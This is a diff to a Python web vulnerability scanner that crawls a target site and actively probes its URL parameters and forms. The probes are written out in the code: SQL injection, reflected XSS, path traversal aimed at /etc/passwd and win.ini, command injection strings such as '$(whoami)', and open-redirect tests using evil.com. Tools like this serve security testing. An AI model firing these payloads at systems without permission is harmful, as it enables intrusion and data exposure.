@@ -48,12 +48,17 @@ class EnhancedVulnerabilityScanner:
         self.target_url = target_url.rstrip('/')
         self.vulnerabilities = []
         self.session = requests.Session()
-        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+        self.headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+        }
         self.discovered_urls = set()
         self.max_threads = max_threads
         self.crawl_depth = crawl_depth
         self.enable_subdomains = enable_subdomains
-        self.forms = []
+        self.forms = []          # list of {url, action, method, inputs}
+        self.param_urls = set()  # FIX: dedicated set for URLs with ?params
 
     def load_payloads(self, file_path):
         try:
@@ -71,31 +76,58 @@ class EnhancedVulnerabilityScanner:
 
         while to_visit:
             url, depth = to_visit.pop(0)
+            # Normalise: strip fragment
+            url = url.split('#')[0]
             if url in visited or depth > max_depth:
                 continue
             visited.add(url)
             try:
                 resp = self.session.get(url, headers=self.headers, timeout=10)
                 self.discovered_urls.add(url)
+
+                # FIX: track URLs that already have query params
+                if '?' in url:
+                    self.param_urls.add(url)
+
                 soup = BeautifulSoup(resp.text, 'html.parser')
+
+                # Extract forms
                 for form in soup.find_all('form'):
-                    self.forms.append({
-                        'url': url,
-                        'action': form.get('action', ''),
-                        'method': form.get('method', 'get').lower(),
-                        'inputs': [inp.get('name') for inp in form.find_all('input') if inp.get('name')]
-                    })
+                    action = form.get('action', '') or ''
+                    full_action = urljoin(url, action)
+                    method = form.get('method', 'get').lower()
+                    inputs = [inp.get('name') for inp in form.find_all(['input', 'textarea', 'select'])
+                              if inp.get('name') and inp.get('type', '') not in ['submit', 'button', 'image', 'reset']]
+                    if inputs:
+                        self.forms.append({
+                            'url': full_action,
+                            'page': url,
+                            'method': method,
+                            'inputs': inputs
+                        })
+                        # FIX: GET forms generate param URLs — add them to param_urls
+                        if method == 'get' and inputs:
+                            fake_url = full_action + '?' + '&'.join(f'{i}=test' for i in inputs)
+                            self.param_urls.add(fake_url)
+
+                # Extract all links
                 for link in soup.find_all('a', href=True):
-                    next_url = urljoin(url, link['href'])
+                    next_url = urljoin(url, link['href']).split('#')[0]
                     next_netloc = urlparse(next_url).netloc
                     same_domain = (next_netloc == base_netloc)
                     subdomain_match = self.enable_subdomains and next_netloc.endswith('.' + base_netloc)
-                    if (same_domain or subdomain_match) and next_url not in visited:
-                        to_visit.append((next_url, depth + 1))
+                    if same_domain or subdomain_match:
+                        # FIX: always track param URLs even if already visited
+                        if '?' in next_url:
+                            self.param_urls.add(next_url)
+                        if next_url not in visited:
+                            to_visit.append((next_url, depth + 1))
+
             except Exception:
                 continue
 
-        print(f"{Fore.GREEN}[+] Discovered {len(self.discovered_urls)} URLs and {len(self.forms)} forms{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[+] Discovered {len(self.discovered_urls)} URLs | "
+              f"{len(self.param_urls)} param URLs | {len(self.forms)} forms{Style.RESET_ALL}")
 
     def _run_threaded(self, fn, items, desc, color="white"):
         results = []
@@ -162,6 +194,8 @@ class EnhancedVulnerabilityScanner:
             categorized[severity].append(vuln)
         return categorized
 
+    # ---- INFO CHECKS ----
+
     def check_technology_detection(self):
         try:
             resp = self.session.get(self.target_url, headers=self.headers, timeout=10)
@@ -192,18 +226,17 @@ class EnhancedVulnerabilityScanner:
     def check_security_headers(self):
         try:
             resp = self.session.get(self.target_url, headers=self.headers, timeout=10)
-            resp_header_keys = [k.lower() for k in resp.headers.keys()]
-            security_headers = [
+            keys = [k.lower() for k in resp.headers.keys()]
+            missing = [h for h in [
                 'Strict-Transport-Security', 'Content-Security-Policy',
                 'X-Content-Type-Options', 'X-Frame-Options',
                 'X-XSS-Protection', 'Referrer-Policy', 'Permissions-Policy'
-            ]
-            missing = [h for h in security_headers if h.lower() not in resp_header_keys]
+            ] if h.lower() not in keys]
             if missing:
                 self.vulnerabilities.append({
                     'type': 'Security Headers Missing',
                     'url': self.target_url,
-                    'description': f'Missing security headers: {", ".join(missing)}'
+                    'description': f'Missing: {", ".join(missing)}'
                 })
         except Exception:
             pass
@@ -213,10 +246,10 @@ class EnhancedVulnerabilityScanner:
             resp = self.session.get(self.target_url, headers=self.headers, timeout=10)
             if resp.headers.get('Server'):
                 self.vulnerabilities.append({'type': 'Server Version Disclosure', 'url': self.target_url,
-                                             'description': f'Server header reveals: {resp.headers["Server"]}'})
+                                             'description': f'Server: {resp.headers["Server"]}'})
             if resp.headers.get('X-Powered-By'):
                 self.vulnerabilities.append({'type': 'Server Version Disclosure', 'url': self.target_url,
-                                             'description': f'X-Powered-By reveals: {resp.headers["X-Powered-By"]}'})
+                                             'description': f'X-Powered-By: {resp.headers["X-Powered-By"]}'})
         except Exception:
             pass
 
@@ -226,7 +259,7 @@ class EnhancedVulnerabilityScanner:
             keys = [h.lower() for h in resp.headers.keys()]
             if 'x-frame-options' not in keys and 'content-security-policy' not in keys:
                 self.vulnerabilities.append({'type': 'Clickjacking', 'url': self.target_url,
-                                             'description': 'No X-Frame-Options or CSP frame-ancestors set'})
+                                             'description': 'No X-Frame-Options or CSP frame-ancestors'})
         except Exception:
             pass
 
@@ -240,7 +273,7 @@ class EnhancedVulnerabilityScanner:
                 acac = resp.headers.get('Access-Control-Allow-Credentials', '')
                 if (acao == origin or acao == '*') and acac.lower() == 'true':
                     self.vulnerabilities.append({'type': 'CORS Misconfiguration', 'url': self.target_url,
-                                                 'description': f'CORS allows credentials from: {origin}'})
+                                                 'description': f'Credentials allowed from: {origin}'})
         except Exception:
             pass
 
@@ -250,18 +283,18 @@ class EnhancedVulnerabilityScanner:
                 resp = self.session.request(method, self.target_url, headers=self.headers, timeout=10)
                 if resp.status_code not in [405, 501]:
                     self.vulnerabilities.append({'type': 'Dangerous HTTP Methods', 'url': self.target_url,
-                                                 'description': f'{method} allowed (status {resp.status_code})'})
+                                                 'description': f'{method} returned {resp.status_code}'})
             except Exception:
                 pass
 
     def check_directory_listing(self):
-        for dir_path in ['/', '/uploads/', '/images/', '/files/', '/backup/', '/admin/']:
+        for path in ['/', '/uploads/', '/images/', '/files/', '/backup/', '/admin/']:
             try:
-                resp = self.session.get(self.target_url + dir_path, headers=self.headers, timeout=10)
+                resp = self.session.get(self.target_url + path, headers=self.headers, timeout=10)
                 if any(x in resp.text for x in ["Index of", "Directory listing", "Parent Directory"]):
                     self.vulnerabilities.append({'type': 'Directory Listing',
-                                                 'url': self.target_url + dir_path,
-                                                 'description': f'Directory listing at: {dir_path}'})
+                                                 'url': self.target_url + path,
+                                                 'description': f'Open listing at: {path}'})
             except Exception:
                 continue
 
@@ -271,7 +304,7 @@ class EnhancedVulnerabilityScanner:
             matches = re.findall(r'\b(?:192\.168|10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)\d{1,3}\.\d{1,3}\b', resp.text)
             if matches:
                 self.vulnerabilities.append({'type': 'Internal IP Disclosure', 'url': self.target_url,
-                                             'description': f'Internal IPs found: {", ".join(set(matches))}'})
+                                             'description': f'IPs found: {", ".join(set(matches))}'})
         except Exception:
             pass
 
@@ -283,7 +316,7 @@ class EnhancedVulnerabilityScanner:
                                                          'mysqli', 'postgresql', 'warning:', 'fatal error']):
                     self.vulnerabilities.append({'type': 'Verbose Error Messages',
                                                  'url': self.target_url + path,
-                                                 'description': 'Stack trace or verbose error exposed'})
+                                                 'description': 'Stack trace or debug info exposed'})
                     break
             except Exception:
                 continue
@@ -291,62 +324,57 @@ class EnhancedVulnerabilityScanner:
     def check_open_redirect(self):
         file_payloads = self.load_payloads(os.path.join(PAYLOAD_DIR, "open_redirect.txt"))
         targets = file_payloads[:5] if file_payloads else ['https://evil.com', '//evil.com']
-        keys = ['url', 'redirect', 'next', 'return', 'goto', 'dest']
+        keys = ['url', 'redirect', 'next', 'return', 'goto', 'dest', 'target', 'redir']
         test_urls = [f"{self.target_url}?{k}={p}" for k in keys for p in targets[:2]]
-
         for test_url in tqdm(test_urls, desc="[Open Redirect]", ncols=100, colour="yellow"):
             try:
                 resp = self.session.get(test_url, allow_redirects=False, headers=self.headers, timeout=10)
                 location = resp.headers.get('Location', '')
-                if resp.status_code in (301, 302, 303, 307, 308) and ('evil.com' in location):
+                if resp.status_code in (301, 302, 303, 307, 308) and 'evil.com' in location:
                     self.vulnerabilities.append({'type': 'Open Redirect', 'url': test_url,
-                                                 'description': f'Open redirect to: {location}'})
+                                                 'description': f'Redirects to: {location}'})
             except Exception:
                 continue
 
     def check_insecure_cookies(self):
-        """FIX: Parse Set-Cookie raw header to correctly detect HttpOnly/SameSite."""
         try:
             resp = self.session.get(self.target_url, headers=self.headers, timeout=10)
-            # Get raw Set-Cookie header text
             raw_set_cookie = resp.headers.get('Set-Cookie', '')
-
             for cookie in resp.cookies:
                 issues = []
                 if not cookie.secure:
                     issues.append('Missing Secure flag')
-                # Search the raw header string (case-insensitive)
-                cookie_segment = ''
+                seg = ''
                 for part in raw_set_cookie.split(','):
                     if f'{cookie.name}=' in part:
-                        cookie_segment = part.lower()
+                        seg = part.lower()
                         break
-                if not cookie_segment:
-                    cookie_segment = raw_set_cookie.lower()
-
-                if 'httponly' not in cookie_segment:
-                    issues.append('Missing HttpOnly flag')
-                if 'samesite' not in cookie_segment:
-                    issues.append('Missing SameSite attribute')
-
+                if not seg:
+                    seg = raw_set_cookie.lower()
+                if 'httponly' not in seg:
+                    issues.append('Missing HttpOnly')
+                if 'samesite' not in seg:
+                    issues.append('Missing SameSite')
                 if issues:
                     self.vulnerabilities.append({'type': 'Insecure Cookies', 'url': self.target_url,
-                                                 'description': f'Cookie "{cookie.name}": {", ".join(issues)}'})
+                                                 'description': f'"{cookie.name}": {", ".join(issues)}'})
         except Exception:
             pass
 
-    # ---- HIGH RISK (threaded) ----
+    # ---- HIGH RISK (threaded, now tests BOTH param URLs AND forms) ----
 
     def _sqli_check_url(self, url):
+        """Test a URL with ?params for SQL injection."""
         found = []
         payloads = self.load_payloads(os.path.join(PAYLOAD_DIR, "sqli.txt")) or \
-                   ["'", "1' OR '1'='1", "' OR 1=1--", "1' UNION SELECT NULL--"]
+                   ["'", "''", "1' OR '1'='1", "' OR 1=1--", "1' UNION SELECT NULL--", "\" OR \"1\"=\"1"]
         parsed = urlparse(url)
         params = parse_qs(parsed.query)
-        sql_errors = ['syntax error', 'mysql', 'mysqli', 'postgresql', 'odbc',
-                      'sql syntax', 'sqlite', 'oracle', 'mssql', 'unclosed quotation']
+        sql_errors = ['sql syntax', 'mysql_fetch', 'mysqli', 'postgresql', 'odbc',
+                      'sqlite', 'oracle error', 'mssql', 'unclosed quotation',
+                      'you have an error in your sql', 'warning: mysql', 'syntax error']
         for param in params:
-            for payload in payloads[:10]:
+            for payload in payloads[:15]:
                 np = params.copy()
                 np[param] = [payload]
                 test_url = parsed._replace(query=urlencode(np, doseq=True)).geturl()
@@ -354,28 +382,60 @@ class EnhancedVulnerabilityScanner:
                     resp = self.session.get(test_url, headers=self.headers, timeout=10)
                     if any(e in resp.text.lower() for e in sql_errors):
                         found.append({'type': 'SQL Injection', 'url': test_url,
-                                      'description': f'SQLi in param: {param}'})
+                                      'description': f'SQLi via GET param: {param}'})
+                        break
+                except Exception:
+                    continue
+        return found
+
+    def _sqli_check_form(self, form):
+        """FIX: Test POST forms for SQL injection."""
+        found = []
+        payloads = self.load_payloads(os.path.join(PAYLOAD_DIR, "sqli.txt")) or \
+                   ["'", "''", "1' OR '1'='1", "' OR 1=1--", "1' UNION SELECT NULL--"]
+        sql_errors = ['sql syntax', 'mysql_fetch', 'mysqli', 'postgresql', 'odbc',
+                      'sqlite', 'oracle error', 'mssql', 'unclosed quotation',
+                      'you have an error in your sql', 'warning: mysql', 'syntax error']
+        for inp in form['inputs']:
+            for payload in payloads[:10]:
+                data = {i: 'test' for i in form['inputs']}
+                data[inp] = payload
+                try:
+                    if form['method'] == 'post':
+                        resp = self.session.post(form['url'], data=data, headers=self.headers, timeout=10)
+                    else:
+                        resp = self.session.get(form['url'], params=data, headers=self.headers, timeout=10)
+                    if any(e in resp.text.lower() for e in sql_errors):
+                        found.append({'type': 'SQL Injection', 'url': form['url'],
+                                      'description': f'SQLi via form field: {inp} (page: {form["page"]})'})
                         break
                 except Exception:
                     continue
         return found
 
     def check_sql_injection(self):
-        urls = [u for u in list(self.discovered_urls)[:20] if '?' in u]
-        if not urls:
-            return
-        results = self._run_threaded(self._sqli_check_url, urls, "[SQL Injection]", "red")
-        self.vulnerabilities.extend(results)
+        all_results = []
+        # Test GET param URLs
+        urls = list(self.param_urls)[:25]
+        if urls:
+            all_results += self._run_threaded(self._sqli_check_url, urls, "[SQLi - URLs]", "red")
+        # FIX: Also test forms
+        forms = self.forms[:20]
+        if forms:
+            all_results += self._run_threaded(self._sqli_check_form, forms, "[SQLi - Forms]", "red")
+        self.vulnerabilities.extend(all_results)
 
     def _xss_check_url(self, url):
+        """Test a URL with ?params for reflected XSS."""
         found = []
         payloads = self.load_payloads(os.path.join(PAYLOAD_DIR, "xss.txt")) or \
                    ['<script>alert(1)</script>', '"><script>alert(1)</script>',
-                    '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>']
+                    '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>',
+                    "'><script>alert(1)</script>"]
         parsed = urlparse(url)
         params = parse_qs(parsed.query)
         for param in params:
-            for payload in payloads[:8]:
+            for payload in payloads[:10]:
                 np = params.copy()
                 np[param] = [payload]
                 test_url = parsed._replace(query=urlencode(np, doseq=True)).geturl()
@@ -383,32 +443,61 @@ class EnhancedVulnerabilityScanner:
                     resp = self.session.get(test_url, headers=self.headers, timeout=10)
                     if payload in resp.text:
                         found.append({'type': 'Cross-Site Scripting (XSS)', 'url': test_url,
-                                      'description': f'Reflected XSS in param: {param}'})
+                                      'description': f'Reflected XSS via GET param: {param}'})
+                        break
+                except Exception:
+                    continue
+        return found
+
+    def _xss_check_form(self, form):
+        """FIX: Test forms for reflected XSS."""
+        found = []
+        payloads = self.load_payloads(os.path.join(PAYLOAD_DIR, "xss.txt")) or \
+                   ['<script>alert(1)</script>', '"><script>alert(1)</script>',
+                    '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>']
+        for inp in form['inputs']:
+            for payload in payloads[:8]:
+                data = {i: 'test' for i in form['inputs']}
+                data[inp] = payload
+                try:
+                    if form['method'] == 'post':
+                        resp = self.session.post(form['url'], data=data, headers=self.headers, timeout=10)
+                    else:
+                        resp = self.session.get(form['url'], params=data, headers=self.headers, timeout=10)
+                    if payload in resp.text:
+                        found.append({'type': 'Cross-Site Scripting (XSS)', 'url': form['url'],
+                                      'description': f'Reflected XSS via form field: {inp} (page: {form["page"]})'})
                         break
                 except Exception:
                     continue
         return found
 
     def check_xss(self):
-        urls = [u for u in list(self.discovered_urls)[:20] if '?' in u]
-        if not urls:
-            return
-        results = self._run_threaded(self._xss_check_url, urls, "[XSS]", "red")
-        self.vulnerabilities.extend(results)
+        all_results = []
+        urls = list(self.param_urls)[:25]
+        if urls:
+            all_results += self._run_threaded(self._xss_check_url, urls, "[XSS - URLs]", "red")
+        # FIX: Also test forms
+        forms = self.forms[:20]
+        if forms:
+            all_results += self._run_threaded(self._xss_check_form, forms, "[XSS - Forms]", "red")
+        self.vulnerabilities.extend(all_results)
 
     def _traversal_check_task(self, args):
         url, payload = args
         found = []
-        for test_url in [f"{url}?file={payload}", f"{url}?path={payload}", f"{url}?page={payload}"]:
+        for test_url in [f"{url}?file={payload}", f"{url}?path={payload}",
+                         f"{url}?page={payload}", f"{url}?doc={payload}",
+                         f"{url}?template={payload}", f"{url}?include={payload}"]:
             try:
                 resp = self.session.get(test_url, headers=self.headers, timeout=10)
                 if re.search(r'root:.*:0:0:', resp.text):
                     found.append({'type': 'Path Traversal', 'url': test_url,
-                                  'description': 'Path traversal - read /etc/passwd'})
+                                  'description': 'Read /etc/passwd via path traversal'})
                     break
                 if '[extensions]' in resp.text.lower() or '[fonts]' in resp.text.lower():
                     found.append({'type': 'Path Traversal', 'url': test_url,
-                                  'description': 'Path traversal - read win.ini'})
+                                  'description': 'Read win.ini via path traversal'})
                     break
             except Exception:
                 continue
@@ -416,15 +505,16 @@ class EnhancedVulnerabilityScanner:
 
     def check_path_traversal(self):
         payloads = self.load_payloads(os.path.join(PAYLOAD_DIR, "traversal.txt")) or \
-                   ['../../../etc/passwd', '....//....//....//etc/passwd', '..%2F..%2Fetc%2Fpasswd']
-        urls = list(self.discovered_urls)[:10]
-        tasks = [(url, p) for url in urls for p in payloads[:6]]
+                   ['../../../etc/passwd', '....//....//....//etc/passwd',
+                    '..%2F..%2F..%2Fetc%2Fpasswd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd']
+        urls = list(self.discovered_urls)[:15]
+        tasks = [(url, p) for url in urls for p in payloads[:5]]
         results = self._run_threaded(self._traversal_check_task, tasks, "[Path Traversal]", "red")
         self.vulnerabilities.extend(results)
 
     def check_command_injection(self):
-        cmd_payloads = ['; ls', '| whoami', '`id`', '$(whoami)', '; id;']
-        urls = [u for u in list(self.discovered_urls)[:10] if '?' in u]
+        cmd_payloads = ['; ls', '| whoami', '`id`', '$(whoami)', '; id;', '& whoami &']
+        urls = list(self.param_urls)[:10]
         for url in tqdm(urls, desc="[Cmd Injection]", ncols=100, colour="red"):
             parsed = urlparse(url)
             params = parse_qs(parsed.query)
@@ -437,7 +527,7 @@ class EnhancedVulnerabilityScanner:
                         resp = self.session.get(test_url, headers=self.headers, timeout=10)
                         if any(x in resp.text.lower() for x in ['uid=', 'gid=', 'root:', 'www-data']):
                             self.vulnerabilities.append({'type': 'Command Injection', 'url': test_url,
-                                                         'description': f'Cmd injection in param: {param}'})
+                                                         'description': f'Cmd exec via param: {param}'})
                             break
                     except Exception:
                         continue
@@ -453,7 +543,7 @@ class EnhancedVulnerabilityScanner:
                 resp = self.session.post(url, data=xxe_payload, headers=h, timeout=10)
                 if 'root:' in resp.text:
                     self.vulnerabilities.append({'type': 'XXE Injection', 'url': url,
-                                                 'description': 'XXE - XML parser reads external entities'})
+                                                 'description': 'XML parser reads external entities'})
             except Exception:
                 continue
 
@@ -500,14 +590,14 @@ def main():
     print_banner()
 
     parser = argparse.ArgumentParser(
-        description="S!M0N vuln-scanner v2: Enhanced web vulnerability scanner with PDF reporting."
+        description="S!M0N vuln-scanner v2: Enhanced web vulnerability scanner."
     )
-    parser.add_argument('-d', '--domain', required=True, help='Target URL (e.g., http://example.com)')
+    parser.add_argument('-d', '--domain', required=True, help='Target URL')
     parser.add_argument('-o', '--output', default="vulnerability_report.pdf", help='Output PDF filename')
     parser.add_argument('-l', '--level', type=int, default=2, help='Crawl depth (default: 2)')
     parser.add_argument('-t', '--threads', type=int, default=5, help='Threads (default: 5)')
     parser.add_argument('--subdomains', action='store_true', help='Include subdomains in scope')
-    parser.add_argument('--no-crawl', action='store_true', help='Skip crawling, scan only the target URL')
+    parser.add_argument('--no-crawl', action='store_true', help='Skip crawling')
 
     args = parser.parse_args()
 
@@ -516,7 +606,7 @@ def main():
     print(f"{Fore.CYAN}[*] Depth:    {args.level}{Style.RESET_ALL}")
     print(f"{Fore.CYAN}[*] Threads:  {args.threads}{Style.RESET_ALL}")
     if args.subdomains:
-        print(f"{Fore.CYAN}[*] Subdomain scope: ENABLED{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[*] Subdomains: ENABLED{Style.RESET_ALL}")
     print()
 
     scanner = EnhancedVulnerabilityScanner(
